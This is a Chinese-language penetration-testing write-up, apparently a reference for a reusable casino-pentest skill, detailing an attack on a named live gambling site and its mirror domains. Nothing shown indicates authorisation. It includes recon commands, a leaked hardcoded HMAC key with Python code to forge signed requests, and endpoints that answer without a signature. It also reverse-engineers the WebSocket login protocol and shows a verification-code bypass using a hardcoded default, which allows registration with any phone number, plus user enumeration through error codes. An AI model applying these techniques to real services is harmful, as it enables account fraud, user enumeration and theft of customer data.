# m9600.com(Nuxt3 + HMAC 签名)完整实战

2026-08 渗透 m9600.com(MM99 菲律宾赌场)的前端 recon 全流程,作为 SPA recon 方法的 worked example。

## 目标

- 前端: Nuxt 3 SPA,资源 CDN `downm9.sp-slots1.com/source/public`
- 后端: `m9600.com/api/*`(Cloudflare + PHP 7.4.19)
- WebSocket: `wss://wsm9.spiritapis.com/net`
- 品牌矩阵:MM99 / 协议名 m9,30+ 镜像域名

## 步骤还原

### 1. SSR payload → 金矿

```bash
curl -s https://m9600.com/hellowin/ -H "User-Agent: <UA>" | grep -oE 'window\.__NUXT__\.config[^<]{0,1500}'
```

拿到:
```
gameURL: "https://t.pg-nmgas.com"     ← API 后端真实域名(与前端不同)
wsURL:   "wss://wsm9.spiritapis.com/net"
assetsURL/imageAssetsURL               ← CDN
env: "production"                      ← API base = window.location.origin
apiBase: "/dev-api"                    ← 仅 development 模式用
ipinfo token: <REDACTED>
gtag/gtm: G-1YHQNJ2S7G / GTM-KRG75XNP
Jenkins 路径: /var/lib/jenkins/workspace/prod-all@2/locales/en
```

### 2. 资源 CDN + config.js

HTML 里 `<script src>` 指向 `downm9.sp-slots1.com`,其中 `config.js`(22KB)含:
- `window.gameTab.config`:货币 PHP、时区 Asia/Manila、充值/提现/邀请配置
- `onesignalInitData`:30+ 镜像域名 + OneSignal appId(横向枚举素材)
- `tabs`:游戏厂商 type ID 映射(1=PG, 2=Jili, 12=PP, 16=FC, 17=CQ9, 18=JDB, 19=WG, 20=SPADE, 21=G759, 22=POPOK, 15=Hacksaw)

### 3. Chunk 枚举

`main.js`(BjDZBdkA.js,804KB)是入口,动态 import 28 个 chunk:

```bash
grep -oE 'import\("\./[A-Za-z0-9_]+\.js"\)' main.js | sort -u
# → 3X8iq6d2.js 7NwvX99N.js B83cXbaf.js ...(28 个)
```

批量下载 + 正则提取。注意 main.js 里直接可搜到:
- 二进制协议定义 `CMD_MB_*`(登录/注册/下注/提现)— 游戏协议走 WebSocket
- `signedPost` 签名函数 + 硬编码 key `7f6e5d4c3b2a1f0e9d8c7b6a`

### 4. 签名还原

```js
// main.js
signedPost:(e,t,a)=>... const r=d=>Object.keys(d).sort()
  .map(_=>encodeURIComponent(_)+"="+encodeURIComponent(d[_])).join("&"),
  s=Date.now(), n=r(t), i=s.toString()+n, o=Q_(i,a), ...
  headers: {"x-timestamp": s, "x-signature": l}, body: n
```

`Q_` 是压缩名,反查 export:`export{jr as A, Qr as H, Vr as U, Gr as a, ...}` → `Qr` 是 `HmacSHA256` 包装,`Gr` 是 `enc.Hex`。

**结论**:`signature = HMAC-SHA256(key="7f6e5d4c3b2a1f0e9d8c7b6a", data=timestamp_ms + sorted_params).hexdigest()`

Python 复现:
```python
import hmac, hashlib, time, urllib.parse
ts = str(int(time.time()*1000))
sp = "&".join(f"{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}" for k,v in sorted(params.items()))
sig = hmac.new(b"7f6e5d4c3b2a1f0e9d8c7b6a", (ts+sp).encode(), hashlib.sha256).hexdigest()
```

### 5. 无签名 GET 直调(绕过关键)

带 Referer/Origin 后,以下接口**无需签名**直接返回数据:
```
/api/withdraw_info     → ["gcash","maya"]
/api/customer_info?dataid= → 客服/TG 渠道配置
/api/get_push_config   → {"code":"0","data":[]}
/api/cpfservice_info   → 0
/api/visitor?dataid=   → "ok"
```

### 6. 403 诊断

- 无 Referer 时 `/api/*` 全 403
- 响应头 `X-Powered-By: PHP/7.4.19` = 应用层 403(缺 header/签名)
- 响应头 `Server: cloudflare` = CDN 层 403

### 7. SPA 兜底假象

`/db.sql`、`/.env`、`/backup.zip` 等全返回 200 = SPA 兜底(index.html),body 是 HTML 非文件。备份文件探测必须看 body。

## 8. WebSocket 二进制协议(业务核心,攻击面所在)

REST 只提供公开配置;**用户数据库在 WS 二进制协议里**。SSR payload 给 `wsURL: wss://wsm9.spiritapis.com/net`。

### 协议表提取(main.js 中 `u` / `Ht` / `xT` / `Ll` / `kl` / `Rl` 对象)

```js
// 主命令
u = { MDM_MB_LOGON:1, MDM_MB_SERVER_LIST:2, MDM_GP_USER_SERVICE:3, ... }
// 子命令(600+):登录/注册/余额/提现/手机绑定/公告/任务
SUB_MB_LOGON_ACCOUNTS:2, SUB_MB_REGISTER_ACCOUNTS:3, SUB_MB_RELOGON:10,
SUB_GP_SERVER_UTC_TIMESTAMP:25, SUB_MB_LOGON_SUCCESS:100, SUB_MB_LOGON_FAILURE:101,
SUB_MB_GetScoreInfo:110, SUB_MB_SendSMSLogonCode:120, SUB_MB_SendSMSRegisteUser:124,
SUB_MB_RESET_LOGON_PASSWORD:130, SUB_MB_GetWithdrawRecord:1226,
SUB_MB_GetOnlineUserInfo:1260, SUB_MB_BindMobile:1282, SUB_MB_GetBetScore:1320 ...
```

### 字段模板(登录/注册攻击面)

```js
// SUB_MB_LOGON_ACCOUNTS 请求
[{t:"uint16_t",k:"moduleID"},{t:"uint32_t",k:"plazaVersion"},{t:"uint8_t",k:"deviceType"},
 {t:"char16_t",k:"machineID",s:33},{t:"char16_t",k:"accounts",s:32},
 {t:"char16_t",k:"logonPass",s:33 /* MD5 hex */},{t:"uint8_t",k:"ipAddr",s:14},
 {t:"utf8",k:"channelName",s:0},{t:"uint32_t",k:"spreadBindID"}]
// SUB_MB_REGISTER_ACCOUNTS = 登录字段 + checkCode(6) + nickName(32) + faceID + gender + adID
// 登录成功响应含 userID/userScore/accounts/nickName/agentID/userFlag
```

- 密码字段是 **MD5 hex**(前端 `ns.md5(S)`),machineID 来自浏览器指纹(`generateBrowserFingerprint` → md5)
- 注意常量表 `B = {LEN_PASSWORD:33, LEN_ACCOUNTS:32, LEN_MACHINE_ID:33, LEN_MD5:33, ...}` 控制字段长度

### C 库(emscripten wasm)帧格式

`hxws-1.1.1.0.js/.wasm`(网络库)内嵌**开发机源码路径**:`/mnt/d/MyProg/hxclient-webasm-network/HxWasmClientWebsocket/`。

```js
// JS 侧调用
Module.WebsocketClient.instance().startWebsocket(url, ip, statusCb, msgCb)
new Uc(mcmd, scmd)  // Writer: allocSendBuffer(cmd) + writeUint*/writeChar16 系列
sendPacket(mcmd, scmd, dataObj)  // 查模板 → writeData → send
```

wasm 导出:`startWebsocket` / `closeWebsocket` / `allocSendBuffer` / `getSendBufferSize` / `htonl/htons/ntohs`(网络序)。**包头/加密在 C 层,JS 侧不可见** — 6 种常见格式(mcmd+scmd+len / 总长+cmd / cmd32+len / len+cmd32 / cmd32 only / mcmd+scmd only)全部无响应 → 需反汇编 wasm 或 hook 浏览器真实 WS 帧。

## 教训

- 前端 JS 硬编码的签名 key 是核心资产:拿 key 就能伪造任何签名请求
- 签名只保护 POST 业务接口;GET 配置/信息接口裸奔
- 无头浏览器被反自动化(about:blank)→ curl + 静态分析是正道
- 博彩站镜像矩阵 = 同一代码多域名,一个域名 recon 通,全部镜像通
- **REST 无用户数据 ≠ 拿不到用户库**:业务在 WS 二进制协议,协议表(登录/注册/查询子命令)就在 main.js 明文里;能否打通取决于 C 库帧格式
- **wasm 字符串泄露开发机路径**是源码仓库/内部工具线索(本案 `/mnt/d/MyProg/...` Windows D 盘)

## 9. 突破(2026-08 后续):Node 加载 wasm 驱动 C 库 → 协议全通

"6 种格式全无响应 → 需反汇编 wasm"是错误结论。**直接把 wasm 网络库下载到本地,
在 Node 里 shim 浏览器环境驱动 C++ 类**(详见 `white-label-casino-pentest` 技能):
`Module.WebsocketClient.instance().startWebsocket(url, ip, statusCb, msgCb)` 让 C 库自己
发包/收包,帧格式从 HEAP 内存 dump,几分钟出结果。

已破解帧格式:`[4B:0][4B:len][4B:每连接随机key][2B:mcmd][2B:scmd][payload]`

### 验证码绕过 + 用户枚举(核心成果)

```
SUB=3 (REGISTER) + checkCode="123456"(前端硬编码默认值!) → 注册即登录成功(任意手机号)
SUB=2 (LOGON) 错密码 → rc=11 "密码错误"(账号存在 = 用户枚举)
重复注册 → rc=12 "账号已经存在"
手工拼包字段错 → rc=9999 "系统繁忙"(伪装拒绝,非握手缺失!)
```

**方法论:手工拼包字段错 → 服务器统一 9999 伪装拒绝,容易误判为"需要更多握手"。
正确做法是复刻前端 writeData 模板驱动 + 取前端默认字段值(moduleID=1、
plazaVersion=101122049、deviceType=3、spreadBindID 登录=1/注册=0、channelName=ORGANIC-10001、
accounts=tag+"00"+callingCode+phone)。** 字段类型严格按协议表:char16=UTF-16LE+padding+null,
`uint8_t s:N`=逐字节数组,`utf8 s:0`=动态长度。

### 会话链(服务器每次响应后断连)

LOGON 拿 dynamicPass → 服务器断连(1006)→ 重连 RELOGON(SUB=10, gameID+DP+platformID=3)
→ 新 DP → 断连 → 重连用最新 DP... 每次 RELOGON 刷新 DP,旧 DP 立即失效(-1)。
查询(GetScoreInfo=110 等)需登录态,否则 SUB_CLNT_NEED_LOGIN(105)。

完整协议逆向细节(字段模板/错误码/RELOGON 解析)见
`white-label-casino-pentest/references/m9600-wasm-ws-protocol.md` 和
`white-label-casino-pentest/templates/emscripten-ws-driver.js`。
